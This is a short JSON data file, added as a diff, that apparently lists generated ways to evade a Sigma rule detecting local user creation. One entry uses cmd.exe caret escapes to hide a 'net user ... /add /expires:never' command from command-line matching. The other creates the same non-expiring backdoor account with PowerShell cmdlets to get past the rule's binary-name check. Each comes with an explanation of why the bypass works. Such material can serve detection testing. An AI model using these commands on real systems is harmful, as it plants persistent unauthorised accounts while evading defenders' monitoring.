@@ -1,0 +1,10 @@
+[
+  {
+    "output": "net us^er testuser P@ssw0rd123! /ad^d /expi^res:never",
+    "explanation": "The Sigma rule checks for the exact continuous strings 'user', 'add', and 'expires:never' within the command line. By using the cmd.exe caret (^) escape character, the strings are broken up in the log event (like Event ID 4688 or Sysmon Event ID 1), bypassing the 'selection_cli' condition while still successfully executing the command."
+  },
+  {
+    "output": "powershell.exe -Command \"New-LocalUser -Name 'testuser' -Password (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force); Set-LocalUser -Name 'testuser' -AccountNeverExpires $true\"",
+    "explanation": "The rule specifically targets the 'net.exe' or 'net1.exe' executables in its 'selection_img' condition. By achieving the exact same objective (creating a local user with a non-expiring account) using native PowerShell cmdlets, the execution completely evades the binary name and original filename checks."
+  }
+]
